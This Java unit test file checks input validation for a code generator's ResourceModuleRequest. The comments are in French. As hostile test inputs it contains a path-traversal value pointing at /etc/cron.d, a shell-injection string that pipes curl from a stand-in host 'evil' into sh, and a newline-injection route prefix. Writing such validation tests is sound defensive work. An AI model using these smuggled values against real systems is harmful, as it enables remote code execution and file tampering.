package com.mr486.generator.dto;

import static org.assertj.core.api.Assertions.assertThat;

import jakarta.validation.Validation;
import jakarta.validation.Validator;
import jakarta.validation.ValidatorFactory;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;

/**
 * Vérifie les contraintes de Bean Validation de {@link ResourceModuleRequest}.
 *
 * <p>Ces contraintes constituent la première ligne de défense : {@code serviceName} et
 * {@code className} sont injectés dans des chemins d'archive, des scripts bash et du code
 * généré, donc toute valeur hors liste blanche (path traversal, métacaractères shell, saut de
 * ligne) doit être rejetée avant tout traitement.
 */
class ResourceModuleRequestValidationTest {

    private static ValidatorFactory factory;
    private static Validator validator;

    @BeforeAll
    static void setUp() {
        factory = Validation.buildDefaultValidatorFactory();
        validator = factory.getValidator();
    }

    @AfterAll
    static void tearDown() {
        factory.close();
    }

    /** Construit une ressource valide de référence. */
    private ResourceModuleRequest valid() {
        ResourceModuleRequest r = new ResourceModuleRequest();
        r.setServiceName("order-service");
        r.setClassName("Order");
        return r;
    }

    @Test
    void valid_resource_has_no_violations() {
        assertThat(validator.validate(valid())).isEmpty();
    }

    @Test
    void blank_service_name_is_rejected() {
        ResourceModuleRequest r = valid();
        r.setServiceName("");
        assertThat(validator.validate(r))
            .anyMatch(v -> "serviceName".equals(v.getPropertyPath().toString()));
    }

    @Test
    void service_name_with_path_traversal_is_rejected() {
        ResourceModuleRequest r = valid();
        r.setServiceName("../../../../etc/cron.d/x");
        assertThat(validator.validate(r))
            .anyMatch(v -> "serviceName".equals(v.getPropertyPath().toString()));
    }

    @Test
    void service_name_with_shell_metacharacters_is_rejected() {
        ResourceModuleRequest r = valid();
        r.setServiceName("x';curl http://evil|sh;'");
        assertThat(validator.validate(r))
            .anyMatch(v -> "serviceName".equals(v.getPropertyPath().toString()));
    }

    @Test
    void class_name_must_be_pascal_case() {
        ResourceModuleRequest r = valid();
        r.setClassName("order");
        assertThat(validator.validate(r))
            .anyMatch(v -> "className".equals(v.getPropertyPath().toString()));
    }

    @Test
    void null_route_prefix_is_allowed() {
        ResourceModuleRequest r = valid();
        r.setRoutePrefix(null);
        assertThat(validator.validate(r)).isEmpty();
    }

    @Test
    void route_prefix_with_newline_is_rejected() {
        ResourceModuleRequest r = valid();
        r.setRoutePrefix("/api/orders\ninjected: true");
        assertThat(validator.validate(r))
            .anyMatch(v -> "routePrefix".equals(v.getPropertyPath().toString()));
    }
}
